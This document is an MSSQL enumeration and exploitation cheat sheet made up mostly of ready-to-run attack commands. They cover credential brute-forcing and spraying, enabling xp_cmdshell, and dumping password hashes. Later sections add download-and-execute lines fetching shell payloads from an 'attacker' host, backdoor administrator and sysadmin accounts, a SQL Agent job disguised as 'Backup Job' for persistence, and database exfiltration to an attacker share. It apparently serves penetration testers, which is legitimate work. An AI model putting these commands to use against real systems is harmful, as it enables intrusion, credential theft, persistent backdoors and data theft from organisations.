# MSSQL Enumeration Cheat Sheet

## Table of Contents
1. [Overview](#overview)
2. [Ports & Protocols](#ports--protocols)
3. [Quick Discovery](#quick-discovery)
4. [Essential Enumeration Workflow](#essential-enumeration-workflow)
   - [Service Detection](#1-service-detection)
   - [Authentication Testing](#2-authentication-testing)
   - [Database Enumeration](#3-database-enumeration)
   - [Command Execution](#4-command-execution)
5. [Manual Interaction](#manual-interaction)
   - [Impacket mssqlclient.py](#impacket-mssqlclientpy)
   - [T-SQL Commands](#t-sql-commands)
   - [System Information Queries](#system-information-queries)
6. [Credential Attacks](#credential-attacks)
7. [Advanced Techniques](#advanced-techniques)
8. [Configuration Analysis](#configuration-analysis)
9. [Common Vulnerabilities](#common-vulnerabilities)
10. [Quick Reference Commands](#quick-reference-commands)
11. [Testing Checklist](#testing-checklist)
12. [Critical Security Issues](#critical-security-issues)

---

## Overview

**Microsoft SQL Server (MSSQL)** is Microsoft's relational database management system, designed primarily for Windows environments. It's commonly integrated with .NET applications and Active Directory, making it a high-value target in Windows domain environments.

### Key Functions
- **Database Management**: Enterprise-scale relational database system
- **Windows Integration**: Native Active Directory authentication support
- **T-SQL Processing**: Microsoft's SQL dialect with extended capabilities
- **System Commands**: Built-in system command execution features
- **.NET Integration**: Strong support for Microsoft development frameworks

### Why MSSQL Matters in Pentesting
- **Domain Integration**: Often connected to Active Directory for authentication
- **System Access**: Built-in command execution capabilities (xp_cmdshell)
- **Privilege Escalation**: Service accounts often run with high privileges
- **Lateral Movement**: Database links can span multiple servers
- **Information Disclosure**: Enterprise data and user information storage

### Common Attack Vectors
- **Weak Authentication**: Default SA account with weak passwords
- **Windows Authentication**: Compromised domain accounts
- **Command Execution**: xp_cmdshell and system stored procedures
- **Privilege Abuse**: Database service running as high-privilege account
- **Database Links**: Trust relationships between database servers

---

## Ports & Protocols

```
1433/tcp - MSSQL Database (default)
1434/udp - MSSQL Browser Service
135/tcp  - RPC Endpoint Mapper
445/tcp  - SMB (for named pipes)
```

### MSSQL Components
| Component | Port | Purpose | Security Notes |
|-----------|------|---------|----------------|
| **Database Engine** | 1433/tcp | Main database service | Primary attack target |
| **Browser Service** | 1434/udp | Instance discovery | Information disclosure |
| **Named Pipes** | 445/tcp | Alternative connection | SMB-based access |
| **DAC** | 1434/tcp | Dedicated Admin Connection | Emergency access |

---

## Quick Discovery

```bash
# Port scan for MSSQL
nmap -p 1433,1434 --open -sV target

# MSSQL-specific scripts
nmap -p 1433 --script=ms-sql-* target

# UDP Browser service
nmap -sU -p 1434 --script=ms-sql-* target
```

---

## Essential Enumeration Workflow

### 1. Service Detection

#### Basic MSSQL Detection
```bash
# Comprehensive MSSQL scan
nmap -p 1433 --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password,ms-sql-config target

# MSSQL Browser service
nmap -sU -p 1434 --script=ms-sql-* target

# Version detection
nmap -p 1433 -sV target
```

#### Metasploit Discovery
```bash
# MSSQL ping module
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS target
run

# MSSQL version scanner
use auxiliary/scanner/mssql/mssql_version
set RHOSTS target
run
```

### 2. Authentication Testing

#### Default Credentials Testing
```bash
# SA account with empty password
impacket-mssqlclient sa@target

# SA account with common passwords
impacket-mssqlclient sa:sa@target
impacket-mssqlclient sa:password@target
impacket-mssqlclient sa:123456@target

# Windows authentication
impacket-mssqlclient domain/user:password@target -windows-auth
impacket-mssqlclient Administrator@target -windows-auth
```

#### Nmap Authentication Scripts
```bash
# Empty password testing
nmap -p 1433 --script=ms-sql-empty-password target

# Brute force attack
nmap -p 1433 --script=ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt target

# Specific user testing
nmap -p 1433 --script=ms-sql-brute --script-args mssql.username=sa target
```

### 3. Database Enumeration

#### Database Discovery
```bash
# Connect and list databases
impacket-mssqlclient user:pass@target -windows-auth
SQL> SELECT name FROM sys.databases;

# List accessible databases
SQL> SELECT name FROM sys.databases WHERE HAS_DBACCESS(name) = 1;
```

#### Table Enumeration
```sql
-- List tables in current database
SELECT table_name FROM information_schema.tables;

-- List tables in specific database
USE database_name;
SELECT name FROM sys.tables;

-- Get table structure
SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users';
```

### 4. Command Execution

#### xp_cmdshell Testing
```sql
-- Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Enable xp_cmdshell (if sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute system commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'hostname';
EXEC xp_cmdshell 'ipconfig';
```

---

## Manual Interaction

### Impacket mssqlclient.py

#### Connection Methods
```bash
# SQL authentication
impacket-mssqlclient user:password@target

# Windows authentication
impacket-mssqlclient domain/user:password@target -windows-auth

# Local Windows authentication
impacket-mssqlclient ./user:password@target -windows-auth

# Specify database
impacket-mssqlclient user:password@target -db database_name

# Custom port
impacket-mssqlclient user:password@target -port 1433
```

#### Connection Troubleshooting
```bash
# Debug connection issues
impacket-mssqlclient user:password@target -debug

# Force TLS
impacket-mssqlclient user:password@target -windows-auth

# Kerberos authentication
impacket-mssqlclient domain/user@target -k -no-pass
```

### T-SQL Commands

#### Basic Information Gathering
```sql
-- Current user and role
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Server information
SELECT @@VERSION;
SELECT @@SERVERNAME;
SELECT SERVERPROPERTY('ProductVersion');

-- Database information
SELECT DB_NAME();
SELECT name FROM sys.databases;

-- Current permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

#### User and Login Enumeration
```sql
-- List SQL logins
SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S', 'U');

-- List Windows logins
SELECT name, type_desc FROM sys.server_principals WHERE type = 'U';

-- List database users
SELECT name, type_desc FROM sys.database_principals;

-- Check login privileges
SELECT 
    sp.name as principal_name,
    sp.type_desc as principal_type,
    r.name as role_name
FROM sys.server_principals sp
JOIN sys.server_role_members rm ON sp.principal_id = rm.member_principal_id
JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
WHERE sp.type IN ('S', 'U');
```

### System Information Queries

#### Configuration Information
```sql
-- Show configuration options
SELECT name, value_in_use FROM sys.configurations;

-- Show advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure;

-- Check dangerous configurations
SELECT name, value_in_use FROM sys.configurations 
WHERE name IN ('xp_cmdshell', 'Ole Automation Procedures', 'Ad Hoc Distributed Queries');
```

#### System Details
```sql
-- Operating system information
SELECT 
    @@SERVERNAME as ServerName,
    @@VERSION as SQLVersion,
    SERVERPROPERTY('ProductVersion') as ProductVersion,
    SERVERPROPERTY('Edition') as Edition,
    SERVERPROPERTY('MachineName') as MachineName;

-- Service account information
EXEC xp_cmdshell 'whoami';

-- Network configuration
EXEC xp_cmdshell 'ipconfig /all';

-- System processes
EXEC xp_cmdshell 'tasklist';
```

---

## Credential Attacks

### Brute Force Attacks

#### Hydra
```bash
# MSSQL brute force
hydra -L users.txt -P passwords.txt mssql://target

# Single user attack
hydra -l sa -P passwords.txt mssql://target

# Windows authentication
hydra -L users.txt -P passwords.txt -s 1433 target mssql

# Custom wordlists
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://target
```

#### Medusa
```bash
# MSSQL brute force with Medusa
medusa -h target -U users.txt -P passwords.txt -M mssql

# SA account specific
medusa -h target -u sa -P passwords.txt -M mssql

# Domain authentication
medusa -h target -u domain\\user -P passwords.txt -M mssql
```

#### Metasploit Brute Force
```bash
# MSSQL login scanner
use auxiliary/scanner/mssql/mssql_login
set RHOSTS target
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# Specific user attack
set USERNAME sa
set PASSWORD_LIST passwords.txt
run
```

### Password Spraying
```bash
# Common passwords against user list
hydra -L users.txt -p 'Password123!' mssql://target
hydra -L users.txt -p 'admin' mssql://target
hydra -L users.txt -p '' mssql://target

# Seasonal passwords
hydra -L users.txt -p 'Summer2024!' mssql://target
```

---

## Advanced Techniques

### Command Execution Methods

#### xp_cmdshell
```sql
-- Enable and use xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'powershell -c Get-Process';

-- Download and execute
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker/shell.exe -OutFile C:\temp\shell.exe"';
EXEC xp_cmdshell 'C:\temp\shell.exe';
```

#### Alternative Command Execution
```sql
-- Ole Automation Procedures
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

DECLARE @shell INT;
EXEC sp_oacreate 'wscript.shell', @shell OUTPUT;
EXEC sp_oamethod @shell, 'run', null, 'cmd.exe /c whoami > C:\temp\output.txt';

-- PowerShell execution
EXEC xp_cmdshell 'powershell -exec bypass -c "Get-ComputerInfo"';
```

### Hash Extraction

#### Credential Dumping
```sql
-- Extract password hashes (requires sysadmin)
SELECT name, password_hash FROM sys.sql_logins;

-- Extract to file
SELECT name, password_hash FROM sys.sql_logins 
FOR XML RAW, ELEMENTS;

-- Use xp_cmdshell to save hashes
EXEC xp_cmdshell 'echo hash_data > C:\temp\hashes.txt';
```

#### Metasploit Hash Dumping
```bash
# MSSQL hash dump
use auxiliary/scanner/mssql/mssql_hashdump
set RHOSTS target
set USERNAME sa
set PASSWORD password
run
```

### Database Links

#### Link Discovery
```sql
-- List database links
SELECT * FROM sys.servers;

-- Query remote server
SELECT * FROM OPENQUERY([REMOTE_SERVER], 'SELECT @@servername');

-- Execute commands on remote server
SELECT * FROM OPENQUERY([REMOTE_SERVER], 'EXEC xp_cmdshell ''whoami''');
```

#### Link Exploitation
```sql
-- Enable RPC on link
EXEC sp_serveroption 'REMOTE_SERVER', 'rpc out', 'true';

-- Execute on remote server via link
EXEC ('EXEC xp_cmdshell ''whoami''') AT [REMOTE_SERVER];

-- Chain through multiple links
EXEC ('EXEC (''EXEC xp_cmdshell ''''whoami'''''') AT [REMOTE_SERVER2]') AT [REMOTE_SERVER1];
```

---

## Configuration Analysis

### Dangerous MSSQL Settings

#### Security Configuration Review
```sql
-- Check dangerous configurations
SELECT name, value_in_use, description FROM sys.configurations 
WHERE name IN (
    'xp_cmdshell',
    'Ole Automation Procedures', 
    'Ad Hoc Distributed Queries',
    'Database Mail XPs',
    'SQL Mail XPs',
    'Agent XPs'
);

-- Check authentication mode
SELECT SERVERPROPERTY('IsIntegratedSecurityOnly') as WindowsAuthOnly;

-- Check sa account status
SELECT name, is_disabled FROM sys.server_principals WHERE name = 'sa';
```

#### Network Configuration
```sql
-- Check network protocols
EXEC xp_readerrorlog 0, 1, N'Server is listening on';

-- Check encryption settings
SELECT 
    session_id,
    encrypt_option,
    auth_scheme 
FROM sys.dm_exec_connections;

-- Check named pipes
SELECT name, value_in_use FROM sys.configurations WHERE name = 'remote access';
```

### Log Analysis
```sql
-- Read SQL Server error log
EXEC xp_readerrorlog;

-- Search for failed logins
EXEC xp_readerrorlog 0, 1, N'Login failed';

-- Check for privilege escalation attempts
EXEC xp_readerrorlog 0, 1, N'sysadmin';
```

---

## Common Vulnerabilities

### Weak Authentication
```bash
# VULNERABILITY: Empty SA password
impacket-mssqlclient sa@target
# Successful connection without password

# VULNERABILITY: Default credentials
impacket-mssqlclient sa:sa@target
impacket-mssqlclient sa:password@target
```

### Command Execution
```sql
-- VULNERABILITY: xp_cmdshell enabled
EXEC xp_cmdshell 'whoami';
-- Result: nt authority\system

-- VULNERABILITY: Excessive service privileges
EXEC xp_cmdshell 'whoami /priv';
-- Shows high privileges like SeDebugPrivilege
```

### Information Disclosure
```sql
-- VULNERABILITY: Exposed database contents
SELECT * FROM sys.databases;
SELECT * FROM information_schema.tables;

-- VULNERABILITY: Credential exposure
SELECT name, password_hash FROM sys.sql_logins;
```

### Privilege Escalation
```sql
-- VULNERABILITY: Service account with admin rights
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Result: 1 (user is sysadmin)

-- VULNERABILITY: Trusted database links
SELECT * FROM sys.servers WHERE is_linked = 1;
```

---

## Quick Reference Commands

### Discovery
```bash
nmap -p 1433 --script=ms-sql-info target
impacket-mssqlclient sa@target
use auxiliary/scanner/mssql/mssql_ping
```

### Authentication
```bash
hydra -l sa -P passwords.txt mssql://target
impacket-mssqlclient sa:password@target
impacket-mssqlclient domain/user:pass@target -windows-auth
```

### Enumeration
```sql
SELECT name FROM sys.databases;
SELECT @@VERSION;
EXEC xp_cmdshell 'whoami';
```

### Command Execution
```sql
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'net user backdoor password /add';
EXEC xp_cmdshell 'net localgroup administrators backdoor /add';
```

---

## Testing Checklist

#### Discovery & Detection
- [ ] Port 1433/1434 open and accessible
- [ ] MSSQL version identification
- [ ] Browser service information gathering
- [ ] Named pipes accessibility

#### Authentication Testing
- [ ] SA account empty password testing
- [ ] Default credential verification
- [ ] Windows authentication testing
- [ ] Brute force attacks (rate-limited)

#### Database Enumeration
- [ ] Database listing and access
- [ ] Table structure discovery
- [ ] User and login enumeration
- [ ] Permission and role analysis

#### Configuration Assessment
- [ ] xp_cmdshell availability
- [ ] Dangerous configuration identification
- [ ] Service account privilege analysis
- [ ] Database link discovery

#### Command Execution
- [ ] System command execution testing
- [ ] File system access verification
- [ ] Network connectivity testing
- [ ] Persistence mechanism deployment

---

## Critical Security Issues

### Empty/Weak SA Password
- **Impact**: Full database administrative access
- **Detection**: Successful login with empty/default SA password
- **Exploitation**: `impacket-mssqlclient sa@target`

### xp_cmdshell Enabled
- **Impact**: System command execution, full server compromise
- **Detection**: Successful xp_cmdshell execution
- **Exploitation**: `EXEC xp_cmdshell 'whoami'`

### High-Privilege Service Account
- **Impact**: Privilege escalation, lateral movement
- **Detection**: Service running as SYSTEM or domain admin
- **Exploitation**: Command execution with elevated privileges

### Database Links
- **Impact**: Lateral movement across database servers
- **Detection**: Linked servers in sys.servers
- **Exploitation**: Command execution on remote servers

### Information Disclosure
- **Impact**: Sensitive data exposure, credential harvesting
- **Detection**: Access to system databases and user data
- **Exploitation**: Password hash extraction, customer data access

---

## Default System Databases

### MSSQL System Databases
```
master       - System information and server configuration
model        - Template for new databases
msdb         - SQL Server Agent jobs and alerts
tempdb       - Temporary objects and operations
resource     - Read-only system objects
```

### Important System Tables
```
sys.databases           - Database listing
sys.tables             - Table information
sys.server_principals  - Server logins
sys.database_principals - Database users
sys.configurations    - Server configuration
sys.servers           - Linked servers
```

---

## Common Default Credentials

### MSSQL Defaults
```
sa:(empty)
sa:sa
sa:password
sa:Password123
sa:admin
administrator:admin
MSSQL:MSSQL
```

### Service Account Patterns
```
DOMAIN\sql_service
DOMAIN\mssql_service
NT SERVICE\MSSQLSERVER
NT AUTHORITY\SYSTEM
```

---

## Advanced Exploitation

### Persistence Techniques
```sql
-- Create backdoor login
EXEC xp_cmdshell 'net user backdoor P@ssw0rd123! /add';
EXEC xp_cmdshell 'net localgroup administrators backdoor /add';
CREATE LOGIN [backdoor] WITH PASSWORD = 'P@ssw0rd123!';
ALTER SERVER ROLE sysadmin ADD MEMBER [backdoor];

-- SQL Server Agent job persistence
USE msdb;
EXEC dbo.sp_add_job 
    @job_name = N'Backup Job';
EXEC dbo.sp_add_jobstep
    @job_name = N'Backup Job',
    @step_name = N'Backup Step',
    @command = N'xp_cmdshell ''powershell -c "IEX (New-Object Net.WebClient).DownloadString(''''http://attacker/shell.ps1'''')"''';
```

### Data Exfiltration
```sql
-- Export database to file
BACKUP DATABASE [database_name] TO DISK = 'C:\temp\backup.bak';
EXEC xp_cmdshell 'copy C:\temp\backup.bak \\attacker\share\';

-- Extract specific data
SELECT * FROM users 
FOR XML RAW, ELEMENTS
```

### Lateral Movement
```sql
-- Query domain information
EXEC xp_cmdshell 'net group "Domain Admins" /domain';
EXEC xp_cmdshell 'nltest /dclist:domain.com';

-- Access other systems
EXEC xp_cmdshell 'psexec \\target -u domain\user -p password cmd.exe';
```
